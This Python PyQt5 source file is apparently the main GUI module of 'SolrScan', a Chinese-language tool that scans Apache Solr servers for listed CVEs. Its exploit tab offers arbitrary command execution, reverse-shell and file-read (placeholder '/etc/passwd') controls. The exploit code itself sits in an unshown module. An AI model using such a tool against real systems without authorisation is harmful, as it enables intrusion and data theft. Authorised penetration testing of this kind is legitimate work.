#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
SolrScan 主程序模块
集成GUI界面与漏洞检测功能
"""

import sys
import os
import json
import time
import base64
import threading
import queue
import logging
import requests
import csv
from datetime import datetime
from urllib.parse import urlparse, urljoin
import xml.etree.ElementTree as ET
from concurrent.futures import ThreadPoolExecutor, as_completed
import importlib
import inspect

# 禁用SSL警告
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# PyQt5 导入
from PyQt5.QtWidgets import (QApplication, QMainWindow, QTabWidget, QWidget, QVBoxLayout,
                             QHBoxLayout, QLabel, QLineEdit, QPushButton, QTextEdit,
                             QTableWidget, QTableWidgetItem, QHeaderView, QComboBox,
                             QCheckBox, QFileDialog, QMessageBox, QProgressBar, QGroupBox,
                             QRadioButton, QSplitter, QFrame, QToolBar, QAction, QMenu,
                             QStatusBar, QSystemTrayIcon, QStyle, QDialog, QFormLayout,
                             QSpinBox, QTreeWidget, QTreeWidgetItem, QStackedWidget, QScrollArea)
from PyQt5.QtGui import QIcon, QFont, QPixmap, QPalette, QColor, QTextCursor, QDesktopServices
from PyQt5.QtCore import Qt, QThread, pyqtSignal, QUrl, QSize, QTimer, QSettings, QTranslator

# 导入自定义模块
from modules.core import SolrScanner, BatchScanner
from modules.utils import normalize_url, generate_random_string

# 日志配置
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# 常量定义
VERSION = "2.0.0"
AUTHOR = "justOnce"
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
DEFAULT_TIMEOUT = 10
DEFAULT_THREADS = 20
MAX_THREADS = 100  # 增加最大线程数上限
DEFAULT_RETRY = 1  # 默认重试次数

# 漏洞类型定义
VULN_TYPES = {
    "rce": "远程命令执行",
    "auth_bypass": "认证绕过",
    "file_read": "文件读取",
    "ssrf": "服务器端请求伪造",
    "info_leak": "信息泄露"
}

# 漏洞详情定义
VULN_DETAILS = {
    "CVE-2017-12629": {
        "name": "Apache Solr XML实体注入与RCE",
        "type": "rce",
        "severity": "高危",
        "affected_versions": "< 7.1.0",
        "description": "Apache Solr存在XML实体注入和远程命令执行漏洞，攻击者可通过构造特殊请求执行任意命令。",
        "reference": "https://github.com/vulhub/vulhub/tree/master/solr/CVE-2017-12629-RCE",
        "params": {
            "check": ["core", "dnslog_domain"],
            "exploit": ["core", "command"]
        }
    },
    "CVE-2019-0193": {
        "name": "Apache Solr DataImportHandler RCE",
        "type": "rce",
        "severity": "高危",
        "affected_versions": "< 8.2.0",
        "description": "Apache Solr DataImportHandler模块存在远程命令执行漏洞，攻击者可通过构造特殊请求执行任意命令。",
        "reference": "https://paper.seebug.org/1009/",
        "params": {
            "check": ["core"],
            "exploit": ["core", "command"]
        }
    },
    "CVE-2019-17558": {
        "name": "Apache Solr Velocity模板注入RCE",
        "type": "rce",
        "severity": "高危",
        "affected_versions": "5.0.0 - 8.3.1",
        "description": "Apache Solr存在Velocity模板注入漏洞，攻击者可通过构造特殊请求执行任意命令。",
        "reference": "https://github.com/jas502n/solr_rce",
        "params": {
            "check": ["core"],
            "exploit": ["core", "command"]
        }
    },
    "CVE-2019-12409": {
        "name": "Apache Solr JMX服务 RCE",
        "type": "rce",
        "severity": "高危",
        "affected_versions": "8.1.1 - 8.2.0",
        "description": "Java ManagementExtensions（JMX）是一种Java技术，为管理和监视应用程序、系统对象、设备（如打印机）和面向服务的网络提供相应的工具。JMX 作为 Java的一种Bean管理机制，如果JMX服务端口暴露，那么远程攻击者可以让该服务器远程加载恶意的Bean文件，随着Bean的滥用导致远程代码执行。",
        "reference": "https://github.com/Threekiii/Awesome-POC/blob/master/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/Apache%20Solr%20JMX%E6%9C%8D%E5%8A%A1%20RCE%20CVE-2019-12409.md",
        "params": {
            "check": [],
            "exploit": ["jmx_port", "command"]
        }
    },
    "CVE-2020-13957": {
        "name": "Apache Solr RCE 未授权上传漏洞",
        "type": "rce",
        "severity": "高危",
        "affected_versions": """
        Apache Solr 6.6.0 -6.6.5
        Apache Solr 7.0.0 -7.7.3
        Apache Solr 8.0.0 -8.6.2""",
        "description": "在特定的Solr版本中ConfigSet API存在未授权上传漏洞，攻击者利用漏洞可实现远程代码执行。",
        "reference": "https://github.com/Threekiii/Awesome-POC/blob/master/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/Apache%20Solr%20RCE%20%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%20CVE-2020-13957.md",
        "params": {
            "check": [],
            "exploit": ["command"]
        }
    },
    "CVE-2021-27905": {
        "name": "Apache Solr Replication Handler SSRF",
        "type": "ssrf",
        "severity": "中危",
        "affected_versions": "< 8.8.2",
        "description": "Apache Solr Replication Handler存在SSRF漏洞，可被利用访问内网资源。",
        "reference": "https://github.com/Threekiii/Awesome-POC",
        "params": {
            "check": ["core"],
            "exploit": ["core", "file_path"]
        }
    },
    "CVE-2023-50290": {
        "name": "Apache Solr环境变量信息泄露",
        "type": "info_leak",
        "severity": "中危",
        "affected_versions": "多个版本",
        "description": "Apache Solr存在环境变量信息泄露漏洞，可获取敏感配置信息。",
        "reference": "https://github.com/Threekiii/Awesome-POC",
        "params": {
            "check": [],
            "exploit": []
        }
    },
    "CNVD-2023-27598": {
        "name": "Apache Solr 代码执行漏洞",
        "type": "rce",
        "severity": "高危",
        "affected_versions": "8.10.0 <= Apache Solr < 9.2.0",
        "description": "Solr 以 Solrcloud 模式启动且可出网时，未经身份验证的远程攻击者可以通过发送特制的数据包进行利用，最终在目标系统上远程执行任意代码。",
        "reference": "https://github.com/Threekiii/Awesome-POC/blob/master/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/Apache%20Solr%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CNVD-2023-27598.md",
        "params": {
            "check": ["dnslog_domain"],
            "exploit": ["command", "dnslog_domain"]
        }
    },
    "CVE-2024-45216": {
        "name": "Apache Solr认证绕过漏洞",
        "type": "auth_bypass",
        "severity": "高危",
        "affected_versions": "5.3.0 - 8.11.4, 9.0.0 - 9.7.0",
        "description": "Apache Solr存在认证绕过漏洞，攻击者可通过构造特殊URL路径绕过认证机制。",
        "reference": "https://solr.apache.org/security.html#cve-2024-45216",
        "params": {
            "check": [],
            "exploit": []
        }
    },
    "SOLR-STREAM-FILE-READ": {
        "name": "Apache Solr RemoteStreaming文件读取",
        "type": "file_read",
        "severity": "中危",
        "affected_versions": "多个版本",
        "description": "Apache Solr RemoteStreaming功能可被利用读取服务器任意文件。",
        "reference": "https://github.com/Threekiii/Awesome-POC",
        "params": {
            "check": ["core"],
            "exploit": ["core", "file_path"]
        }
    }
}

# 测试地址列表
TEST_TARGETS = [
    "https://demo.solr.apache.org/",
    "http://solr-test.example.com:8983/"
]

class ScannerThread(QThread):
    """扫描线程类"""
    
    # 信号定义
    update_signal = pyqtSignal(dict)
    progress_signal = pyqtSignal(int, int)
    finished_signal = pyqtSignal(dict)
    log_signal = pyqtSignal(str)
    
    def __init__(self, targets, selected_vulns, timeout=DEFAULT_TIMEOUT, proxy=None, max_threads=DEFAULT_THREADS, retry=DEFAULT_RETRY):
        """初始化扫描线程
        
        Args:
            targets: 目标URL列表
            selected_vulns: 选择的漏洞ID列表
            timeout: 请求超时时间
            proxy: 代理设置
            max_threads: 最大线程数
            retry: 请求重试次数
        """
        super().__init__()
        self.targets = targets
        self.selected_vulns = selected_vulns
        self.timeout = timeout
        self.proxy = proxy
        self.max_threads = max_threads
        self.retry = retry
        self.results = {}
        self.stop_event = threading.Event()
        
    def run(self):
        """线程执行函数"""
        self.log_signal.emit(f"开始扫描 {len(self.targets)} 个目标，使用 {self.max_threads} 个线程")
        
        # 创建批量扫描器
        batch_scanner = BatchScanner(
            self.targets,
            self.selected_vulns,
            timeout=self.timeout,
            proxy=self.proxy,
            max_threads=self.max_threads,
            retry=self.retry
        )
        
        # 设置回调函数
        batch_scanner.on_progress = self.on_progress
        batch_scanner.on_result = self.on_result
        batch_scanner.on_finished = self.on_finished
        batch_scanner.stop_event = self.stop_event
        
        # 启动扫描
        batch_scanner.scan()
        
        # 如果扫描被停止，发送停止信号
        if batch_scanner.stop_event.is_set():
            self.log_signal.emit("扫描已停止")
    
    def on_progress(self, completed, total):
        """进度回调
        
        Args:
            completed: 已完成数量
            total: 总数量
        """
        self.progress_signal.emit(completed, total)
    
    def on_result(self, result):
        """结果回调
        
        Args:
            result: 扫描结果
        """
        self.results.update(result)
        self.update_signal.emit(result)
    
    def on_finished(self, results):
        """完成回调
        
        Args:
            results: 所有扫描结果
        """
        self.results = results
        self.finished_signal.emit(results)
    
    def stop(self):
        """停止扫描"""
        self.stop_event.set()


class MainWindow(QMainWindow):
    """主窗口类"""
    
    def __init__(self):
        """初始化主窗口"""
        super().__init__()
        
        # 窗口设置
        self.setWindowTitle(f"Apache Solr漏洞扫描利用工具 By justOnce")
        self.setMinimumSize(1000, 700)
        
        # 状态变量
        self.scanner_thread = None
        self.scan_results = {}
        
        # 初始化UI
        self.init_ui()
        
        # 显示欢迎信息
        self.log_message("欢迎使用SolrScan工具，请配置扫描目标和选项。")

    def init_ui(self):
        # 显示免责声明对话框
        disclaimer = QMessageBox()
        disclaimer.setWindowTitle("⚠ 网络安全工具免责声明")
        disclaimer.setIcon(QMessageBox.Warning)
        disclaimer.setText(
            "<h3>⚠ 使用前须知</h3>"
            "<p>本工具仅供 <b>网络安全测试</b> 与 <b>教育学习</b> 之用途，"
            "使用者必须严格遵守《中华人民共和国网络安全法》等相关法律法规。</p>"
            "<p>严禁将本工具用于任何未经授权的渗透、攻击、入侵、扫描等非法行为。"
            "若违反规定，一切法律责任由使用者本人承担，开发者不承担任何责任。</p>"
            "<p>继续使用代表您已阅读并同意本声明。</p>"
        )
        disclaimer.setStandardButtons(QMessageBox.Yes | QMessageBox.No)
        disclaimer.setDefaultButton(QMessageBox.No)
        result = disclaimer.exec_()

        if result == QMessageBox.No:
            sys.exit()



        # 创建中央窗口部件
        central_widget = QWidget()
        self.setCentralWidget(central_widget)

        # 主布局
        main_layout = QVBoxLayout(central_widget)



        # 创建主分割器
        main_splitter = QSplitter(Qt.Horizontal)
        main_layout.addWidget(main_splitter)

        # 左侧面板 - 漏洞模块导航树
        left_panel = QWidget()
        left_layout = QVBoxLayout(left_panel)
        left_layout.setContentsMargins(0, 0, 0, 0)

        # 创建漏洞模块树
        self.vuln_tree = QTreeWidget()
        self.vuln_tree.setHeaderLabel("漏洞模块")
        self.vuln_tree.setMinimumWidth(250)
        self.populate_vuln_tree()
        self.vuln_tree.itemClicked.connect(self.on_vuln_tree_item_clicked)
        left_layout.addWidget(self.vuln_tree)

        # 右侧面板 - 主要内容区
        right_panel = QWidget()
        right_layout = QVBoxLayout(right_panel)
        right_layout.setContentsMargins(0, 0, 0, 0)

        # 创建选项卡部件
        self.tab_widget = QTabWidget()
        self.create_scanner_tab()
        self.create_results_tab()
        self.create_exploit_tab()
        self.create_about_tab()
        right_layout.addWidget(self.tab_widget)

        # 添加到分割器
        main_splitter.addWidget(left_panel)
        main_splitter.addWidget(right_panel)
        main_splitter.setSizes([250, 750])

        # 创建状态栏
        self.status_bar = QStatusBar()
        self.setStatusBar(self.status_bar)
        self.status_bar.showMessage("就绪")

        # 清除日志按钮
        clear_log_button = QPushButton("清除日志")
        clear_log_button.clicked.connect(self.clear_logs)
        self.status_bar.addPermanentWidget(clear_log_button)

        # 进度条
        self.progress_bar = QProgressBar()
        self.progress_bar.setMaximumWidth(200)
        self.progress_bar.setVisible(False)
        self.status_bar.addPermanentWidget(self.progress_bar)

    def populate_vuln_tree(self):
        """填充漏洞模块树"""
        # 按漏洞类型分组
        vuln_groups = {}
        for vuln_id, details in VULN_DETAILS.items():
            vuln_type = details["type"]
            if vuln_type not in vuln_groups:
                vuln_groups[vuln_type] = []
            vuln_groups[vuln_type].append((vuln_id, details))
        
        # 创建树节点
        for vuln_type, vulns in vuln_groups.items():
            type_name = VULN_TYPES.get(vuln_type, vuln_type)
            type_item = QTreeWidgetItem(self.vuln_tree, [type_name])
            
            for vuln_id, details in vulns:
                vuln_item = QTreeWidgetItem(type_item, [f"{details['name']} ({vuln_id})"])
                vuln_item.setData(0, Qt.UserRole, vuln_id)
        
        # 展开所有节点
        self.vuln_tree.expandAll()
    
    def on_vuln_tree_item_clicked(self, item, column):
        """处理漏洞树项点击事件"""
        vuln_id = item.data(0, Qt.UserRole)
        if vuln_id and vuln_id in VULN_DETAILS:
            details = VULN_DETAILS[vuln_id]
            self.show_vuln_details(vuln_id, details)
    
    def show_vuln_details(self, vuln_id, details):
        """显示漏洞详情"""
        # 切换到漏洞利用选项卡
        self.tab_widget.setCurrentIndex(2)
        
        # 更新漏洞详情
        self.exploit_vuln_id.setText(vuln_id)
        self.exploit_vuln_name.setText(details["name"])
        self.exploit_vuln_type.setText(VULN_TYPES.get(details["type"], details["type"]))
        self.exploit_vuln_severity.setText(details["severity"])
        self.exploit_vuln_affected.setText(details["affected_versions"])
        self.exploit_vuln_description.setText(details["description"])
        self.exploit_vuln_reference.setText(details["reference"])
        
        # 更新所需参数提示
        self.update_exploit_params(vuln_id)
    
    def update_exploit_params(self, vuln_id):
        """更新漏洞利用所需参数提示
        
        Args:
            vuln_id: 漏洞ID
        """
        if vuln_id not in VULN_DETAILS:
            return
        
        details = VULN_DETAILS[vuln_id]
        params = details.get("params", {})
        
        # 获取漏洞利用所需参数
        exploit_params = params.get("exploit", [])
        
        # 更新参数提示
        if "core" in exploit_params:
            self.exploit_core_label.setVisible(True)
            self.exploit_core_input.setVisible(True)
        else:
            self.exploit_core_label.setVisible(False)
            self.exploit_core_input.setVisible(False)
        
        if "dnslog_domain" in exploit_params:
            self.exploit_DNSLOG_label.setVisible(True)
            self.exploit_DNSLOG_input.setVisible(True)
            self.exploit_DNSLOG_btn.setVisible(True)
        else:
            self.exploit_DNSLOG_label.setVisible(False)
            self.exploit_DNSLOG_input.setVisible(False)
            self.exploit_DNSLOG_btn.setVisible(False)
        
        if "command" in exploit_params:
            self.exploit_cmd_label.setVisible(True)
            self.exploit_cmd_input.setVisible(True)
            self.exploit_cmd_btn.setVisible(True)
        else:
            self.exploit_cmd_label.setVisible(False)
            self.exploit_cmd_input.setVisible(False)
            self.exploit_cmd_btn.setVisible(False)
        
        if "file_path" in exploit_params:
            self.exploit_file_path_label.setVisible(True)
            self.exploit_file_path_input.setVisible(True)
            self.exploit_file_btn.setVisible(True)
        else:
            self.exploit_file_path_label.setVisible(False)
            self.exploit_file_path_input.setVisible(False)
            self.exploit_file_btn.setVisible(False)
        
        if "jmx_port" in exploit_params:
            self.exploit_jmx_port_label.setVisible(True)
            self.exploit_jmx_port_input.setVisible(True)
        else:
            self.exploit_jmx_port_label.setVisible(False)
            self.exploit_jmx_port_input.setVisible(False)
        
        # 反弹Shell始终可见
        self.exploit_shell_label.setVisible(True)
        self.exploit_ip_input.setVisible(True)
        self.exploit_port_input.setVisible(True)
        self.exploit_shell_btn.setVisible(True)
    
    def create_scanner_tab(self):
        """创建扫描器选项卡"""
        scanner_tab = QWidget()
        layout = QVBoxLayout(scanner_tab)
        
        # 目标配置组
        target_group = QGroupBox("目标配置")
        target_layout = QVBoxLayout(target_group)
        
        # 目标输入
        target_input_layout = QHBoxLayout()
        target_input_layout.addWidget(QLabel("目标URL:"))
        self.target_input = QLineEdit()
        self.target_input.setPlaceholderText("输入单个URL或多个URL（每行一个）")
        target_input_layout.addWidget(self.target_input)
        
        add_target_btn = QPushButton("添加")
        add_target_btn.clicked.connect(self.add_target)
        target_input_layout.addWidget(add_target_btn)
        
        target_layout.addLayout(target_input_layout)
        
        # 目标列表
        target_layout.addWidget(QLabel("目标列表:"))
        self.target_list = QTextEdit()
        self.target_list.setPlaceholderText("目标列表为空，请添加目标")
        target_layout.addWidget(self.target_list)
        
        # 测试目标按钮
        test_targets_layout = QHBoxLayout()
        test_targets_layout.addStretch()
        
        add_test_targets_btn = QPushButton("添加测试目标")
        add_test_targets_btn.clicked.connect(self.add_test_targets)
        test_targets_layout.addWidget(add_test_targets_btn)
        
        clear_targets_btn = QPushButton("清空目标")
        clear_targets_btn.clicked.connect(self.clear_targets)
        test_targets_layout.addWidget(clear_targets_btn)
        
        target_layout.addLayout(test_targets_layout)
        
        layout.addWidget(target_group)
        
        # 扫描选项组
        scan_options_group = QGroupBox("扫描选项")
        scan_options_layout = QVBoxLayout(scan_options_group)
        
        # 漏洞选择
        scan_options_layout.addWidget(QLabel("选择要检测的漏洞:"))
        
        vuln_checkboxes_layout = QVBoxLayout()
        self.vuln_checkboxes = {}
        
        for vuln_id, details in VULN_DETAILS.items():
            checkbox = QCheckBox(f"{details['name']} ({vuln_id})")
            checkbox.setChecked(True)
            self.vuln_checkboxes[vuln_id] = checkbox
            vuln_checkboxes_layout.addWidget(checkbox)
        
        scan_options_layout.addLayout(vuln_checkboxes_layout)
        
        # 选择按钮
        select_buttons_layout = QHBoxLayout()
        select_all_btn = QPushButton("全选")
        select_all_btn.clicked.connect(self.select_all_vulns)
        select_buttons_layout.addWidget(select_all_btn)
        
        deselect_all_btn = QPushButton("取消全选")
        deselect_all_btn.clicked.connect(self.deselect_all_vulns)
        select_buttons_layout.addWidget(deselect_all_btn)
        
        scan_options_layout.addLayout(select_buttons_layout)
        
        # 高级选项
        advanced_options_layout = QHBoxLayout()
        
        # 超时设置
        advanced_options_layout.addWidget(QLabel("超时(秒):"))
        self.timeout_input = QSpinBox()
        self.timeout_input.setRange(1, 60)
        self.timeout_input.setValue(DEFAULT_TIMEOUT)
        advanced_options_layout.addWidget(self.timeout_input)
        
        # 线程数设置
        advanced_options_layout.addWidget(QLabel("线程数:"))
        self.threads_input = QSpinBox()
        self.threads_input.setRange(1, MAX_THREADS)  # 增加线程数上限
        self.threads_input.setValue(DEFAULT_THREADS)
        advanced_options_layout.addWidget(self.threads_input)
        
        # 重试次数设置
        advanced_options_layout.addWidget(QLabel("重试次数:"))
        self.retry_input = QSpinBox()
        self.retry_input.setRange(0, 5)
        self.retry_input.setValue(DEFAULT_RETRY)
        advanced_options_layout.addWidget(self.retry_input)
        
        # 代理设置
        advanced_options_layout.addWidget(QLabel("代理:"))
        self.proxy_input = QLineEdit()
        self.proxy_input.setPlaceholderText("http://127.0.0.1:8080")
        advanced_options_layout.addWidget(self.proxy_input)
        
        scan_options_layout.addLayout(advanced_options_layout)
        
        layout.addWidget(scan_options_group)
        
        # 操作按钮
        buttons_layout = QHBoxLayout()
        buttons_layout.addStretch()
        
        start_scan_btn = QPushButton("开始扫描")
        start_scan_btn.clicked.connect(self.start_scan)
        buttons_layout.addWidget(start_scan_btn)
        
        stop_scan_btn = QPushButton("停止扫描")
        stop_scan_btn.clicked.connect(self.stop_scan)
        buttons_layout.addWidget(stop_scan_btn)

        continue_scan_btn = QPushButton("继续扫描")
        continue_scan_btn.clicked.connect(self.continue_scan)
        buttons_layout.addWidget(continue_scan_btn)
        
        layout.addLayout(buttons_layout)
        
        # 日志输出
        log_group = QGroupBox("日志输出")
        log_layout = QVBoxLayout(log_group)
        
        self.log_output = QTextEdit()
        self.log_output.setReadOnly(True)
        log_layout.addWidget(self.log_output)
        
        layout.addWidget(log_group)
        
        self.tab_widget.addTab(scanner_tab, "扫描器")
    def continue_scan(self):
        """继续扫描"""
        if self.scanner_thread and self.scanner_thread.isRunning():
            QMessageBox.warning(self, "警告", "扫描正在进行中，请勿重复操作！")
            return

        if not self.remaining_targets:
            QMessageBox.information(self, "提示", "没有未完成的目标可以继续扫描。")
            return
    def create_results_tab(self):
        """创建结果选项卡"""
        results_tab = QWidget()
        layout = QVBoxLayout(results_tab)
        
        # 结果表格
        self.results_table = QTableWidget()
        self.results_table.setColumnCount(5)
        self.results_table.setHorizontalHeaderLabels(["目标", "版本", "漏洞", "状态", "详情"])
        self.results_table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        self.results_table.setSelectionBehavior(QTableWidget.SelectRows)
        self.results_table.itemDoubleClicked.connect(self.on_result_item_double_clicked)
        layout.addWidget(self.results_table)
        
        # 操作按钮
        buttons_layout = QHBoxLayout()
        buttons_layout.addStretch()
        
        export_results_btn = QPushButton("导出结果")
        export_results_btn.clicked.connect(self.export_results)
        buttons_layout.addWidget(export_results_btn)
        
        clear_results_btn = QPushButton("清空结果")
        clear_results_btn.clicked.connect(self.clear_results)
        buttons_layout.addWidget(clear_results_btn)
        
        layout.addLayout(buttons_layout)
        
        self.tab_widget.addTab(results_tab, "扫描结果")

    def create_exploit_tab(self):
        """创建漏洞利用选项卡，使用表单布局保持字段对齐"""
        exploit_tab = QWidget()
        main_layout = QVBoxLayout(exploit_tab)
        main_layout.setContentsMargins(10, 10, 10, 10)
        main_layout.setSpacing(15)

        # 漏洞详情
        vuln_group = QGroupBox("漏洞详情")
        vuln_form = QFormLayout(vuln_group)
        vuln_form.setLabelAlignment(Qt.AlignRight)
        vuln_form.setHorizontalSpacing(12)
        vuln_form.setVerticalSpacing(8)

        self.exploit_vuln_id = QLineEdit();
        self.exploit_vuln_id.setReadOnly(True)
        self.exploit_vuln_name = QLineEdit();
        self.exploit_vuln_name.setReadOnly(True)
        self.exploit_vuln_type = QLineEdit();
        self.exploit_vuln_type.setReadOnly(True)
        self.exploit_vuln_severity = QLineEdit();
        self.exploit_vuln_severity.setReadOnly(True)
        self.exploit_vuln_affected = QLineEdit();
        self.exploit_vuln_affected.setReadOnly(True)
        self.exploit_vuln_description = QTextEdit();
        self.exploit_vuln_description.setReadOnly(True);
        self.exploit_vuln_description.setFixedHeight(60)
        self.exploit_vuln_reference = QLineEdit();
        self.exploit_vuln_reference.setReadOnly(True)

        vuln_form.addRow("漏洞ID:", self.exploit_vuln_id)
        vuln_form.addRow("漏洞名称:", self.exploit_vuln_name)
        vuln_form.addRow("漏洞类型:", self.exploit_vuln_type)
        vuln_form.addRow("危险等级:", self.exploit_vuln_severity)
        vuln_form.addRow("影响版本:", self.exploit_vuln_affected)
        vuln_form.addRow("漏洞描述:", self.exploit_vuln_description)
        vuln_form.addRow("参考链接:", self.exploit_vuln_reference)
        main_layout.addWidget(vuln_group)

        # 漏洞利用
        exploit_group = QGroupBox("漏洞利用")
        form = QFormLayout(exploit_group)
        form.setLabelAlignment(Qt.AlignRight)
        form.setHorizontalSpacing(12)
        form.setVerticalSpacing(10)

        # 目标URL
        self.exploit_target_input = QLineEdit();
        self.exploit_target_input.setPlaceholderText("http://example.com:8983")
        form.addRow("目标URL:", self.exploit_target_input)
        
        # 核心名称
        self.exploit_core_label = QLabel("核心名称:")
        self.exploit_core_input = QLineEdit();
        self.exploit_core_input.setPlaceholderText("solr核心名称，如不填将自动获取")
        form.addRow(self.exploit_core_label, self.exploit_core_input)

        # JMX端口
        self.exploit_jmx_port_label = QLabel("JMX端口:")
        self.exploit_jmx_port_input = QLineEdit();
        self.exploit_jmx_port_input.setPlaceholderText("JMX服务端口，默认18983")
        self.exploit_jmx_port_input.setText("18983")
        form.addRow(self.exploit_jmx_port_label, self.exploit_jmx_port_input)

        # DNSLOG
        self.exploit_DNSLOG_label = QLabel("DNSLOG:")
        dns_layout = QHBoxLayout()
        self.exploit_DNSLOG_input = QLineEdit();
        self.exploit_DNSLOG_input.setPlaceholderText("xxx.dnslog.cn")
        self.exploit_DNSLOG_btn = QPushButton("执行");
        self.exploit_DNSLOG_btn.clicked.connect(self.do_dnslog)
        dns_layout.addWidget(self.exploit_DNSLOG_input)
        dns_layout.addWidget(self.exploit_DNSLOG_btn)
        form.addRow(self.exploit_DNSLOG_label, dns_layout)

        # RCE 命令
        self.exploit_cmd_label = QLabel("命令:")
        cmd_layout = QHBoxLayout()
        self.exploit_cmd_input = QLineEdit();
        self.exploit_cmd_input.setPlaceholderText("id")
        self.exploit_cmd_btn = QPushButton("执行");
        self.exploit_cmd_btn.clicked.connect(self.execute_command)
        cmd_layout.addWidget(self.exploit_cmd_input)
        cmd_layout.addWidget(self.exploit_cmd_btn)
        form.addRow(self.exploit_cmd_label, cmd_layout)

        # 反弹Shell
        self.exploit_shell_label = QLabel("反弹Shell:")
        shell_layout = QHBoxLayout()
        self.exploit_ip_input = QLineEdit();
        self.exploit_ip_input.setPlaceholderText("IP")
        self.exploit_port_input = QLineEdit();
        self.exploit_port_input.setPlaceholderText("Port")
        self.exploit_shell_btn = QPushButton("获取Shell");
        self.exploit_shell_btn.clicked.connect(self.get_reverse_shell)
        shell_layout.addWidget(self.exploit_ip_input)
        shell_layout.addWidget(self.exploit_port_input)
        shell_layout.addWidget(self.exploit_shell_btn)
        form.addRow(self.exploit_shell_label, shell_layout)

        # 文件读取
        self.exploit_file_path_label = QLabel("文件读取:")
        file_layout = QHBoxLayout()
        self.exploit_file_path_input = QLineEdit();
        self.exploit_file_path_input.setPlaceholderText("/etc/passwd")
        self.exploit_file_btn = QPushButton("读取");
        self.exploit_file_btn.clicked.connect(self.read_file)
        file_layout.addWidget(self.exploit_file_path_input)
        file_layout.addWidget(self.exploit_file_btn)
        form.addRow(self.exploit_file_path_label, file_layout)

        # 执行结果
        self.exploit_result_output = QTextEdit();
        self.exploit_result_output.setReadOnly(True);
        self.exploit_result_output.setFixedHeight(100)
        form.addRow("执行结果:", self.exploit_result_output)

        # 滚动区包裹
        scroll = QScrollArea();
        scroll.setWidgetResizable(True)
        container = QWidget();
        container.setLayout(form)
        scroll.setWidget(container)
        main_layout.addWidget(exploit_group)
        main_layout.addWidget(scroll)

        self.tab_widget.addTab(exploit_tab, "漏洞利用")

    def create_about_tab(self):
        """创建关于选项卡"""
        about_tab = QWidget()
        layout = QVBoxLayout(about_tab)

        # 标题
        title_label = QLabel(f"SolrScan v{VERSION}")
        title_label.setAlignment(Qt.AlignCenter)
        title_font = QFont()
        title_font.setPointSize(16)
        title_font.setBold(True)
        title_label.setFont(title_font)
        layout.addWidget(title_label)

        # 描述
        desc_label = QLabel("Apache Solr漏洞扫描利用工具")
        desc_label.setAlignment(Qt.AlignCenter)
        layout.addWidget(desc_label)

        # 作者
        author_label = QLabel(f"作者: {AUTHOR}")
        author_label.setAlignment(Qt.AlignCenter)
        layout.addWidget(author_label)

        layout.addSpacing(20)

        # 功能介绍
        features_group = QGroupBox("主要功能")
        features_layout = QVBoxLayout(features_group)
        
        features = [
            "支持多种Apache Solr漏洞检测",
            "支持批量扫描多个目标",
            "支持漏洞利用功能",
            "支持导出扫描结果"
        ]
        
        for feature in features:
            label = QLabel(f"• {feature}")
            features_layout.addWidget(label)
        
        layout.addWidget(features_group)
        
        # 漏洞列表
        vulns_group = QGroupBox("支持的漏洞")
        vulns_layout = QVBoxLayout(vulns_group)
        
        for vuln_id, details in VULN_DETAILS.items():
            label = QLabel(f"• {details['name']} ({vuln_id})")
            vulns_layout.addWidget(label)
        
        layout.addWidget(vulns_group)
        
        layout.addStretch()
        
        self.tab_widget.addTab(about_tab, "关于")
    
    def add_target(self):
        """添加目标"""
        target = self.target_input.text().strip()
        if not target:
            return
        
        # 处理多行输入
        targets = target.split('\n')
        current_targets = self.target_list.toPlainText().strip().split('\n')
        if current_targets == ['']:
            current_targets = []
        
        # 添加新目标
        for t in targets:
            t = t.strip()
            if t and t not in current_targets:
                current_targets.append(t)
        
        # 更新目标列表
        self.target_list.setText('\n'.join(current_targets))
        self.target_input.clear()
    
    def add_test_targets(self):
        """添加测试目标"""
        current_targets = self.target_list.toPlainText().strip().split('\n')
        if current_targets == ['']:
            current_targets = []
        
        # 添加测试目标
        for t in TEST_TARGETS:
            if t not in current_targets:
                current_targets.append(t)
        
        # 更新目标列表
        self.target_list.setText('\n'.join(current_targets))
    
    def clear_targets(self):
        """清空目标"""
        self.target_list.clear()
    
    def select_all_vulns(self):
        """选择所有漏洞"""
        for checkbox in self.vuln_checkboxes.values():
            checkbox.setChecked(True)
    
    def deselect_all_vulns(self):
        """取消选择所有漏洞"""
        for checkbox in self.vuln_checkboxes.values():
            checkbox.setChecked(False)
    
    def start_scan(self):
        """开始扫描"""
        # 获取目标列表
        targets = self.target_list.toPlainText().strip().split('\n')
        if not targets or targets == ['']:
            QMessageBox.warning(self, "警告", "请添加扫描目标")
            return
        
        # 规范化目标URL
        targets = [normalize_url(t) for t in targets if t.strip()]
        
        # 获取选择的漏洞
        selected_vulns = [vuln_id for vuln_id, checkbox in self.vuln_checkboxes.items() if checkbox.isChecked()]
        if not selected_vulns:
            QMessageBox.warning(self, "警告", "请选择要检测的漏洞")
            return
        
        # 获取扫描选项
        timeout = self.timeout_input.value()
        max_threads = self.threads_input.value()
        retry = self.retry_input.value()
        proxy = self.proxy_input.text().strip() if self.proxy_input.text().strip() else None
        
        # 清空结果表格
        self.results_table.setRowCount(0)
        
        # 创建扫描线程
        self.scanner_thread = ScannerThread(
            targets, 
            selected_vulns, 
            timeout=timeout, 
            proxy=proxy, 
            max_threads=max_threads,
            retry=retry
        )
        self.scanner_thread.update_signal.connect(self.update_scan_results)
        self.scanner_thread.progress_signal.connect(self.update_progress)
        self.scanner_thread.finished_signal.connect(self.scan_finished)
        self.scanner_thread.log_signal.connect(self.log_message)
        
        # 开始扫描
        self.scanner_thread.start()
        
        # 更新UI状态
        self.progress_bar.setVisible(True)
        self.progress_bar.setValue(0)
        self.progress_bar.setMaximum(len(targets))
        self.status_bar.showMessage("扫描中...")
        
